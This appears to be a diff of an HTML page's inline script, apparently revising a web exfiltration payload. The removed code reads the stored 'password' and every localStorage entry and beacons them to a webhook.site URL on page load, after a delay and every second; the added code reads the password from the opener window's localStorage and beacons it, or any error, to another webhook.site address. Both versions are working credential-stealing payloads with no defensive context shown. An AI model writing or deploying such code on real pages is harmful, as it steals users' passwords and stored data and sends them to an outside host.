@@ -5,27 +5,16 @@
 </head>
 <body>
     <script>
-        function sendData(data) {
-            navigator.sendBeacon('https://webhook.site/c67df85d-d59b-49eb-a928-a775dfed2b82?' + data);
+        try {
+            // Try to access parent window's localStorage
+            const parentPass = window.opener?.localStorage?.getItem('password');
+            
+            // Send data via beacon (CORS-safe)
+            navigator.sendBeacon('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?password=' + parentPass);
+            
+        } catch(e) {
+            navigator.sendBeacon('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?error=' + e.toString());
         }
-
-        function checkStorage() {
-            const password = localStorage.getItem('password');
-            const allStorage = JSON.stringify(Object.entries(localStorage));
-            sendData('check=true&password=' + password + '&storage=' + allStorage);
-        }
-
-        // Initial check
-        document.addEventListener('DOMContentLoaded', () => {
-            sendData('status=dom_loaded');
-            checkStorage();
-        });
-
-        // Delayed check
-        setTimeout(checkStorage, 2000);
-
-        // Periodic check
-        setInterval(checkStorage, 1000);
     </script>
 </body>
 </html>
